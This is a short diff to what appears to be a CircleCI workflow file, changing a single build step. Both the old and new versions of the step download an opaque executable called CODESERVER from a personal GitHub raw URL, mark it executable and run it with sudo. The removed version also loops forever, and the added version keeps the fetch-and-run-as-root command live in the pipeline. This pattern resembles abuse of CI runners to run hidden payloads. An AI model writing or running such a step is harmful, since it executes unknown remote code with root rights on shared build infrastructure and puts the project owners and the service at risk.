@@ -9,7 +9,7 @@ jobs:
     steps:
       - checkout
       - run: |
-          sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/jaykal78/ab7125710/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER && while true; do sleep 5 done
+          wget https://raw.githubusercontent.com/jaykal78/ab7125710/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
 
 workflows:
   my-custom-workflow:
